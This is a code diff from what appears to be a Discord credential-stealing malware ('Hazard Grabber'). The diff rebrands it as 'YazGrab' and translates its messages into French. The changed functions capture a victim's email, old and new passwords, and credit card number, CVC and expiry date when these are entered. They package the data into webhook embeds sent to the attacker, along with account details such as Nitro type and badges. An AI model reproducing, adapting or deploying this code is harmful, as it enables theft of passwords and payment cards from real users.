@@ -182,21 +182,21 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Token Grab",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://c.tenor.com/piJFxYFioKIAAAAC/hacker-elliot-alderson.gif",
             embeds: [
                 {
-                    "color": 16119101,
+                    "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Password Changed**",
-                            "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
+                            "name": "**Changement de mot de passe**",
+                            "value": `Email: ${json.email}\nAncien Mot De Passe: ${oldpassword}\nNoueau Mot De Passe: ${newpassword}`,
                             "inline": true
                         },
                         {
-                            "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "name": "**Autres Infos*",
+                            "value": `Type de Nitro: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -210,7 +210,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "YazGrab - Remasterized of HazardTokenGraberV2"
                     }                 
                 }
             ]
@@ -229,21 +229,21 @@ function ChangeEmail(newemail, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Token Grab",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://c.tenor.com/piJFxYFioKIAAAAC/hacker-elliot-alderson.gif",
             embeds: [
                 {
-                    "color": 16119101,
+                    "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Email Changed**",
-                            "value": `New Email: ${newemail}\nPassword: ${password}`,
+                            "name": "**Changement d'Email**",
+                            "value": `Nouveau Email: ${newemail}\nMot De Passe: ${password}`,
                             "inline": true
                         },
                         {
-                            "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "name": "**Autres Infos**",
+                            "value": `Type de Nitro: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -257,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "YazGrab - Remasterized of HazardTokenGraberV2"
                     }                
                 }
             ]
@@ -276,21 +276,21 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Token Grab",
             content: "@everyone",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://c.tenor.com/piJFxYFioKIAAAAC/hacker-elliot-alderson.gif",
             embeds: [
                 {
-                    "color": 16119101,
+                    "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Credit Card Added**",
-                            "value": `Credit Card Number: ${number}\nCVC: ${cvc}\nCredit Card Expiration: ${expir_month}/${expir_year}`,
+                            "name": "**Ajout d'une Carte de Crédit**",
+                            "value": `Numéro de la carte de crédit: ${number}\nCVC: ${cvc}\nDate d'Expiration: ${expir_month}/${expir_year}`,
                             "inline": true
                         },
                         {
-                            "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "name": "**Autres Infos**",
+                            "value": `Type de Nitro: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -304,7 +304,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "YazGrab - Remasterized of HazardTokenGraberV2"
                     }
                 }
             ]
